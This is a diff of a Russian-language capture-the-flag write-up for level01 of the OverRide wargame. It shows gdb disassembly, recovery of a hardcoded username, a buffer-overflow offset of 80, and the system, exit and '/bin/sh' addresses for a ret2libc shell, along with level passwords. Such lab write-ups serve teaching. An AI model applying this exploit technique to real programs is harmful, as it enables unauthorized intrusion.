@@ -1,8 +1,12 @@
+[back](../defense.md)
+
 su level01
+
 Password: uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL
 
 В этом уровне программа level01 просит ввести имя пользователя:
 
+```
 level01@OverRide:~$ ./level01
 	********* ADMIN LOGIN PROMPT *********
 	Enter Username: qwe
@@ -12,34 +16,45 @@ level01@OverRide:~$ ./level01
 
 gdb level01
 (gdb) disas main
+```
 
 Среди прочих, есть интресная строка
+```
 0x0804852d <+93>:	call   0x8048464 <verify_user_name>
+```
 Смотрим, что в ней.
+
 Видим там команду сравнения регистров edi & esi с пересылками перд ними.
+```
 0x08048478 <+20>:	mov    $0x804a040,%edx
 0x0804847d <+25>:	mov    $0x80486a8,%eax
 0x08048482 <+30>:	mov    $0x7,%ecx
 0x08048487 <+35>:	mov    %edx,%esi
 0x08048489 <+37>:	mov    %eax,%edi
 0x0804848b <+39>:	repz cmpsb %es:(%edi),%ds:(%esi)
+```
 
-В регистр edi идет пересылка с регистра eax, куда записывается значение
-с адреса 0x80486a8
-А в регистр esi идет пересылка с регистра edx, куда записывается значение
-с адреса 0x804a040
-Пройдясь по адресам видим, что по одному адресу лежит имя пользователя,
-а во втором то, что мы вводим:
+В регистр edi идет пересылка с регистра eax, куда записывается значение с адреса 0x80486a8
 
+А в регистр esi идет пересылка с регистра edx, куда записывается значение с адреса 0x804a040
+
+Пройдясь по адресам видим, что по одному адресу лежит имя пользователя, а во втором то, что мы вводим:
+
+```
 (gdb) x/s 0x804a040
 	0x804a040 <a_user_name>:	 ""
 
 (gdb) x/s 0x80486a8
 	0x80486a8:	 "dat_wil"
+```
+
 Соответственно dat_wil это имя пользователя.
+
 Осталось добыть пароль
+
 Предварительно создаем последовательность переполнения буфера
 
+```
 (gdb) r
 	Starting program: /home/users/level01/level01
 	********* ADMIN LOGIN PROMPT *********
@@ -50,16 +65,20 @@ gdb level01
 	nope, incorrect password...
 	Program received signal SIGSEGV, Segmentation fault.
 	0x37634136 in ?? ()
+```
 
-и подставляем значение
-https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+и подставляем значение https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+
+```
 	EIP Value: 
 	0x37634136
 	Offset:
 	80
 	(Bytes are in reverse order. ex 0xDEADBEEF is showing as 0xEFBEADDE)
+```
 
 Ищем, где лежит /bin/sh
+```
 (gdb) info proc map
 	process 2840
 	Mapped address spaces:
@@ -87,8 +106,10 @@ https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generato
 
 (gdb) x/s 0xf7f897ec
 	0xf7f897ec:	 "/bin/sh"
+```
 
 Ищем системную функцию:
+```
 (gdb) i func system
 	All functions matching regular expression "system":
 	Non-debugging symbols:
@@ -98,12 +119,17 @@ https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generato
 
 (gdb) i func exit
 	0xf7e5eb70  exit
+```
 
 "A"*80 - смещение
+
 0xf7e6aed0  system
+
 0xf7e5eb70  exit
+
 0xf7f897ec:	 "/bin/sh"
 
+```
 (gdb) q
 	y
 
@@ -125,5 +151,8 @@ su level02
 Password: PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
 	RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 	No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02
+```
 
 Уровень пройден.
+
+[back](../defense.md)
